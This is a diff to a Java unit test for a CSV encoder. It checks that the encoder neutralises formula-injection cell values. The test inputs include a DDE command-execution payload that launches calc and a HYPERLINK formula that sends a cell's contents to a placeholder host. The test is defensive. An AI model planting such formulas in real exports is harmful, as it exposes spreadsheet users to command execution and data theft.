@@ -18,6 +18,15 @@ class CsvEncoderTest {
     }
 
     @Test
+    void neutralisesFormulasHiddenBehindLeadingWhitespaceOrControlChars() {
+        assertEquals("\"' =1+1\"", CsvEncoder.cell(" =1+1"));
+        assertEquals("\"'\u00a0@SUM(A1)\"", CsvEncoder.cell("\u00a0@SUM(A1)"));
+        assertEquals("\"'\u0000=cmd|' /C calc'!A0\"", CsvEncoder.cell("\u0000=cmd|' /C calc'!A0"));
+        assertEquals("\"  Jane\"", CsvEncoder.cell("  Jane"));
+        assertEquals("\"   \"", CsvEncoder.cell("   "));
+    }
+
+    @Test
     void quotesAndDoublesEmbeddedQuotes() {
         assertEquals("\"'=HYPERLINK(\"\"https://x.example/?d=\"\"&B2,\"\"open\"\")\"",
                 CsvEncoder.cell("=HYPERLINK(\"https://x.example/?d=\"&B2,\"open\")"));
